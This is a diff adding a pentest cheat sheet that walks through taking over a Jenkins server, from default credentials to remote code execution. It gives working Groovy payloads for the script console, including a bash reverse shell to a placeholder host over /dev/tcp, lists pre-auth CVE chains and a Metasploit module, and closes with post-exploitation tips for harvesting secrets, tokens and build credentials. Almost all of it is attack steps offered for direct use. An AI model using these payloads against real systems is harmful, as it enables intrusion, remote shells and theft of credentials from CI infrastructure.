@@ -1,0 +1,67 @@
+🧠 “Got This → Do That” – Jenkins Discovery to RCE
+✅ Got This: Port 8080 or Jenkins login panel seen
+Do This:
+
+Try /login
+
+Try default creds: admin:admin, admin:password, jenkins:jenkins, etc
+
+If you see Script Console link = high perms
+
+✅ Got This: Logged in or no auth required
+Do This:
+
+Browse to /script
+
+Run this Groovy for test:
+
+groovy
+Copy
+Edit
+def cmd = 'id'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+✅ Got This: Command output returns
+Do This:
+
+For reverse shell on Linux:
+
+groovy
+Copy
+Edit
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/YOURIP/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+For Windows:
+
+groovy
+Copy
+Edit
+def cmd = "cmd.exe /c whoami".execute()
+println("${cmd.text}")
+✅ Got This: Need CVE-based access (no creds, no script access)
+Do This:
+
+Enumerate version in page source or footer
+
+Google: Jenkins <version> exploit
+
+Try:
+
+CVE-2018-1999002 + CVE-2019-1003000 (Groovy/JAR pre-auth RCE chain)
+
+CVE-2019-1003029 (sandbox escape)
+
+Metasploit: exploit/multi/http/jenkins_script_console
+
+💡 Pro Tip: Jenkins is often SYSTEM/root on internal tests. If you get in, check for:
+
+RDP / WinRM enabled (drop user or creds)
+
+Environment variables (secrets/tokens)
+
+Build jobs with creds baked in
+
